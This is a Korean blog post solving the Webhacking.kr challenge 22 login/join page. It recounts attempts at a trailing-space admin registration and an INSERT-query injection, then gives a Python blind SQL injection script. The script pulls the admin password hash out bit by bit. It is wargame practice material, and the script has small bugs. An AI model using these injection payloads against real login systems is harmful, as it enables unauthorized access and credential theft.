---
layout: post
title: Webhacking.kr - chall22 풀이
comments:true
categories : [Web]
tags: [Web]
---


# 문제

- id, pw를 입력할 수 있고
- login, join 버튼이 존재한다.
- login시
  - 성공시 id와 md5 해쉬된 패스워드 값이 출력된다.
  - 실패시 Login Fail이 출력된다
- join시
  - id, pw를 가입할 수 있다.



# 풀이

- 블라인드 인젝션으로 하면 쉽게 풀수있을 것 같았지만

  - `join`기능을 만든 이유가 있을거라고 생각했다.

- `join`으로 우회해서 admin으로 로그인할 방법을 찾아보았다.

  - mysql에서 뒤에 공백을 추가해서 id를 만들어도 조회시에 똑같은 조건으로 검색된다.
    - `admin공~~~~~~백` 으로 가입해보려고 했지만 `no admin`이 출력되었다.
    - 문자열로 입력했기 때문이라고 생각해서
      - insert 쿼리 조작으로 `aaa', 'aaa'),(0xadmin공~~백의 헥스값, 1234)#` 이렇게 뒤에다가 insert 값을 추가해서 헥스로 넣어보려고 했지만 id가 길다고 나온다.
        - php에서 검사하는것 같다.
  - 방법을 못찾겠다.. 블라인드 인젝션으로 풀자

- 코딩

  ```python
  while True:
      words = ''
      for idx in range(7): 
          payload = 'admin\'&&substr(lpad(conv(hex(substr(pw,{0},1)),16,2),7,0),{1},1)=1#'
          payload = payload.format(len(flags)+1, idx+1)
          params= {'uuid': payload, 'pw':'guest'}
          print params
  
          res = requests.post(url+page, data=params, cookies= cookies)
          if res.text.find('Fail') != -1:
              words += '0'
          else:
              words += '1'
  
  
      ch = int(words,2)
      if ch == '\00':
          break
      else:
          ch = chr(ch)
          print 'founded...'
          print 'words: ' + ch
          flags += ch
          print 'flags: ' + flags
          
  
  print 'founded successfully...'
  print 'flag is here!: ' + flags
  
  ```

  

# 알게된 것

### insert 시 뒤에 공백 삽입으로 우회 in sql

- `'admin'`, `'admin공~~~~~백'`을 삽입한 후
  - `select * from where id='admin'`을 조회하면 두가지 값 모두 반환한다.



### 숫자는 문자열숫자값과 같다 in sql

- 예를들어
  - `select '5'=5`를 하면 1이 반환된다.
  - `select '6'=5`를 하면 0이 반환된다.
- 놀랍구나..
